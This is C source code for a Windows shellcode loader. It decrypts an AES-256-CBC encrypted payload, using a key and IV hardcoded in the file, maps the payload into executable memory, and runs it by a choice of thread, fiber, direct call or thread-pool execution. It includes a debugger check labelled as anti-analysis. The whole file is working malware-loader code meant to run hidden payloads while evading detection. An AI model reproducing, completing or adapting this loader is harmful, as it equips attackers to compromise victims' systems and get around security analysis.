#include <windows.h>
#include <string.h>



static const unsigned char kAesKey[32] = {
    0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6, 0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C,
    0x76, 0x2E, 0x71, 0x60, 0xF3, 0x8B, 0x45, 0x6D, 0xF5, 0x3A, 0x67, 0x6C, 0x4D, 0xA1, 0xBC, 0xDE,
};
static const unsigned char kAesIv[16] = {
    0x5A, 0xE6, 0x1B, 0x3C, 0x8F, 0x72, 0x4D, 0x90, 0x17, 0xBE, 0x23, 0x48, 0xE9, 0x0C, 0x65, 0xFA,
};


#include "payload.h"

// Pick one execution technique
#define TECHNIQUE_CREATE_THREAD  1
// #define TECHNIQUE_FIBER          1
// #define TECHNIQUE_DIRECT         1
// #define TECHNIQUE_TP_WORK        1



static const unsigned char s_box[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

static const unsigned char inv_s_box[256] = {
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
};

static const unsigned char rcon[11] = {
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};



static void xor_block(unsigned char* dst, const unsigned char* src, size_t len) {
    for (size_t i = 0; i < len; i++) dst[i] ^= src[i];
}

static void sub_bytes(unsigned char* state) {
    for (int i = 0; i < 16; i++) state[i] = s_box[state[i]];
}

static void inv_sub_bytes(unsigned char* state) {
    for (int i = 0; i < 16; i++) state[i] = inv_s_box[state[i]];
}

static void shift_rows(unsigned char* state) {
    unsigned char tmp;
    tmp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = tmp;
    tmp = state[2]; state[2] = state[10]; state[10] = tmp;
    tmp = state[6]; state[6] = state[14]; state[14] = tmp;
    tmp = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = state[3]; state[3] = tmp;
}

static void inv_shift_rows(unsigned char* state) {
    unsigned char tmp;
    tmp = state[13]; state[13] = state[9]; state[9] = state[5]; state[5] = state[1]; state[1] = tmp;
    tmp = state[2]; state[2] = state[10]; state[10] = tmp;
    tmp = state[6]; state[6] = state[14]; state[14] = tmp;
    tmp = state[3]; state[3] = state[7]; state[7] = state[11]; state[11] = state[15]; state[15] = tmp;
}

static unsigned char gf_mul(unsigned char a, unsigned char b) {
    unsigned char result = 0;
    unsigned char temp = a;
    for (int i = 0; i < 8; i++) {
        if (b & 1) result ^= temp;
        temp = (temp & 0x80) ? (unsigned char)((temp << 1) ^ 0x1b) : (unsigned char)(temp << 1);
        b >>= 1;
    }
    return result;
}

static void mix_columns(unsigned char* state) {
    for (int i = 0; i < 4; i++) {
        int col = i * 4;
        unsigned char a0 = state[col], a1 = state[col + 1], a2 = state[col + 2], a3 = state[col + 3];
        state[col] = (unsigned char)(gf_mul(a0, 2) ^ gf_mul(a1, 3) ^ a2 ^ a3);
        state[col + 1] = (unsigned char)(a0 ^ gf_mul(a1, 2) ^ gf_mul(a2, 3) ^ a3);
        state[col + 2] = (unsigned char)(a0 ^ a1 ^ gf_mul(a2, 2) ^ gf_mul(a3, 3));
        state[col + 3] = (unsigned char)(gf_mul(a0, 3) ^ a1 ^ a2 ^ gf_mul(a3, 2));
    }
}

static void inv_mix_columns(unsigned char* state) {
    for (int i = 0; i < 4; i++) {
        int col = i * 4;
        unsigned char a0 = state[col], a1 = state[col + 1], a2 = state[col + 2], a3 = state[col + 3];
        state[col] = (unsigned char)(gf_mul(a0, 14) ^ gf_mul(a1, 11) ^ gf_mul(a2, 13) ^ gf_mul(a3, 9));
        state[col + 1] = (unsigned char)(gf_mul(a0, 9) ^ gf_mul(a1, 14) ^ gf_mul(a2, 11) ^ gf_mul(a3, 13));
        state[col + 2] = (unsigned char)(gf_mul(a0, 13) ^ gf_mul(a1, 9) ^ gf_mul(a2, 14) ^ gf_mul(a3, 11));
        state[col + 3] = (unsigned char)(gf_mul(a0, 11) ^ gf_mul(a1, 13) ^ gf_mul(a2, 9) ^ gf_mul(a3, 14));
    }
}

static void add_round_key(unsigned char* state, const unsigned char* rk) {
    xor_block(state, rk, 16);
}

static void aes256_key_expansion(const unsigned char* key, unsigned char round_keys[15][16]) {
    unsigned char w[60][4];
    unsigned char temp[4];

    for (int i = 0; i < 8; i++) {
        w[i][0] = key[i * 4 + 0];
        w[i][1] = key[i * 4 + 1];
        w[i][2] = key[i * 4 + 2];
        w[i][3] = key[i * 4 + 3];
    }

    for (int i = 8; i < 60; i++) {
        temp[0] = w[i - 1][0];
        temp[1] = w[i - 1][1];
        temp[2] = w[i - 1][2];
        temp[3] = w[i - 1][3];

        if (i % 8 == 0) {
            unsigned char t = temp[0];
            temp[0] = s_box[temp[1]];
            temp[1] = s_box[temp[2]];
            temp[2] = s_box[temp[3]];
            temp[3] = s_box[t];
            temp[0] ^= rcon[i / 8];
        }
        else if (i % 8 == 4) {
            temp[0] = s_box[temp[0]];
            temp[1] = s_box[temp[1]];
            temp[2] = s_box[temp[2]];
            temp[3] = s_box[temp[3]];
        }

        w[i][0] = (unsigned char)(w[i - 8][0] ^ temp[0]);
        w[i][1] = (unsigned char)(w[i - 8][1] ^ temp[1]);
        w[i][2] = (unsigned char)(w[i - 8][2] ^ temp[2]);
        w[i][3] = (unsigned char)(w[i - 8][3] ^ temp[3]);
    }

    for (int r = 0; r < 15; r++) {
        for (int j = 0; j < 4; j++) {
            round_keys[r][j * 4 + 0] = w[r * 4 + j][0];
            round_keys[r][j * 4 + 1] = w[r * 4 + j][1];
            round_keys[r][j * 4 + 2] = w[r * 4 + j][2];
            round_keys[r][j * 4 + 3] = w[r * 4 + j][3];
        }
    }
}

static void aes256_decrypt_block(unsigned char* block, const unsigned char round_keys[15][16]) {
    add_round_key(block, round_keys[14]);
    for (int round = 13; round >= 1; round--) {
        inv_shift_rows(block);
        inv_sub_bytes(block);
        add_round_key(block, round_keys[round]);
        inv_mix_columns(block);
    }
    inv_shift_rows(block);
    inv_sub_bytes(block);
    add_round_key(block, round_keys[0]);
}

static unsigned char* aes256_cbc_decrypt(const unsigned char* ciphertext, SIZE_T ciphertext_len, const unsigned char* key, const unsigned char* iv, SIZE_T* plaintext_len, BOOL* decrypt_ok)
{
    *plaintext_len = 0;
    *decrypt_ok = FALSE;

    if (ciphertext_len == 0 || (ciphertext_len % 16) != 0)
        return NULL;

    unsigned char round_keys[15][16];
    aes256_key_expansion(key, round_keys);

    unsigned char* plaintext = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ciphertext_len);
    if (!plaintext) return NULL;

    unsigned char block[16];
    unsigned char prev_block[16];
    memcpy(prev_block, iv, 16);

    SIZE_T num_blocks = ciphertext_len / 16;
    for (SIZE_T i = 0; i < num_blocks; i++) {
        const unsigned char* ct_block = ciphertext + (i * 16);
        memcpy(block, ct_block, 16);
        aes256_decrypt_block(block, round_keys);
        xor_block(block, prev_block, 16);
        memcpy(plaintext + (i * 16), block, 16);
        memcpy(prev_block, ct_block, 16);
    }

    // PKCS7 padding validation
    unsigned char pad_val = plaintext[ciphertext_len - 1];
    if (pad_val < 1 || pad_val > 16) {
        HeapFree(GetProcessHeap(), 0, plaintext);
        return NULL;
    }
    for (unsigned char i = 0; i < pad_val; i++) {
        if (plaintext[ciphertext_len - 1 - i] != pad_val) {
            HeapFree(GetProcessHeap(), 0, plaintext);
            return NULL;
        }
    }

    *plaintext_len = ciphertext_len - pad_val;
    *decrypt_ok = TRUE;
    return plaintext;
}



static LPVOID MapExecutable(const void* src, SIZE_T size) {
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, src, size);
    DWORD old = 0;
    if (!VirtualProtect(mem, size, PAGE_EXECUTE_READWRITE, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return NULL;
    }
    FlushInstructionCache(GetCurrentProcess(), mem, size);
    return mem;
}



#ifdef TECHNIQUE_CREATE_THREAD
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    LPVOID exec_mem = MapExecutable(shellcode, size);
    if (!exec_mem) return 1;

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }


    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
#endif

#ifdef TECHNIQUE_FIBER
struct FiberCtx {
    LPVOID main_fiber;
    LPVOID exec_mem;
    SIZE_T exec_size;
};

static void WINAPI FiberShellcodeRoutine(LPVOID lpParam) {
    FiberCtx* ctx = (FiberCtx*)lpParam;
    ((void(*)())ctx->exec_mem)();
    SwitchToFiber(ctx->main_fiber);
}

static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    LPVOID exec_mem = MapExecutable(shellcode, size);
    if (!exec_mem) return 1;

    LPVOID main_fiber = ConvertThreadToFiber(NULL);
    if (!main_fiber) {
        main_fiber = GetCurrentFiber();
        if (!main_fiber || main_fiber == (LPVOID)0x1E00) {
            ((void(*)())exec_mem)();
            Sleep(INFINITE);
            return 0;
        }
    }

    FiberCtx ctx;
    ctx.main_fiber = main_fiber;
    ctx.exec_mem = exec_mem;
    ctx.exec_size = size;

    LPVOID sf = CreateFiber(0, FiberShellcodeRoutine, &ctx);
    if (!sf) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    SwitchToFiber(sf);
    DeleteFiber(sf);
    ConvertFiberToThread();
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    Sleep(INFINITE);
    return 0;
}
#endif

#ifdef TECHNIQUE_DIRECT
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    LPVOID exec_mem = MapExecutable(shellcode, size);
    if (!exec_mem) return 1;
    ((void(*)())exec_mem)();

    Sleep(INFINITE);
    return 0;
}
#endif

#ifdef TECHNIQUE_TP_WORK
static DWORD WINAPI WorkCallback(LPVOID param) {
    ((void(*)())param)();
    return 0;
}
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    LPVOID exec_mem = MapExecutable(shellcode, size);
    if (!exec_mem) return 1;
    if (!QueueUserWorkItem(WorkCallback, exec_mem, WT_EXECUTELONGFUNCTION)) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }
    Sleep(INFINITE);
    return 0;
}
#endif

static BOOL IsDebugged(void) {
    if (IsDebuggerPresent()) return TRUE;
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    return remote;
}



static void RunPayload(void) {
    if (IsDebugged()) {
        // Anti-analysis: sleep to waste sandbox time
        // Sleep(30000);
    }

    SIZE_T payload_size = 0;
    BOOL ok = FALSE;
    unsigned char* shellcode = aes256_cbc_decrypt(kEncryptedShellcode, kEncryptedSize, kAesKey, kAesIv, &payload_size, &ok);

    if (!shellcode || !ok || payload_size == 0) {
        if (shellcode) HeapFree(GetProcessHeap(), 0, shellcode);
        return;
    }

    ExecutePayload(shellcode, (DWORD)payload_size);
    HeapFree(GetProcessHeap(), 0, shellcode);
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;


    BOOL pause = (strstr(GetCommandLineA(), "--pause") != NULL);

    RunPayload();

    if (pause) {
        MessageBoxA(NULL, "Payload finished.", "Loader", MB_OK);
    }
    return 0;
}

int main(int argc, char* argv[]) {
    (void)argc; (void)argv;
    return WinMain(NULL, NULL, (LPSTR)"", 0);
}
